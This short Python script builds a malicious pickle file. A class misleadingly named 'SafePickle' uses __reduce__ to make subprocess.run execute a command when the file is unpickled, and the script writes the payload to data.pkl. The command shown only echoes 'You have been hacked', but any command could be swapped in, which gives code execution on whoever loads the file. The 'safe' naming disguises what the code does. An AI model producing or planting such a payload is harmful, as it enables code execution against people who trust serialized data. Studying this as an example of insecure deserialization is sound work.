from pickle import Pickler
import subprocess

class SafePickle(object):
    def __reduce__(self):
        return (subprocess.run, (['echo', 'You have been hacked'],))

def serialize_safe():
    with open('data.pkl', 'wb') as f:
        pickler = Pickler(f)
        pickler.dispatch_table = {}
        pickler.save(SafePickle())

serialize_safe()

